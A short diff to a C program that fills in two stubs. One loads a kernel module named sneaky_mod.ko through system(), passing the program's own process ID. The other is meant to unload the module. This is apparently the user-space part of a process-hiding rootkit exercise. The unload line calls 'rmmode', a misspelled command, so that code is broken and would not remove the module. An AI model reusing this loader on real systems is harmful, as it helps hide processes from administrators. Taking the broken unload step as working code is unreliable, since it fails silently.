@@ -28,7 +28,9 @@ void addMsg(const char * fname, const char * msg) {
 }
 
 void loadModule() {
-    // TODO
+    char buf[100];
+    sprintf(buf, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
+    system(buf);
 }
 
 void loopForQuit() {
@@ -40,7 +42,7 @@ void loopForQuit() {
 }
 
 void unloadModule() {
-    //TODO
+    system("rmmode sneaky_mod.ko");
 }
 
 void printFile(const char * fname) {
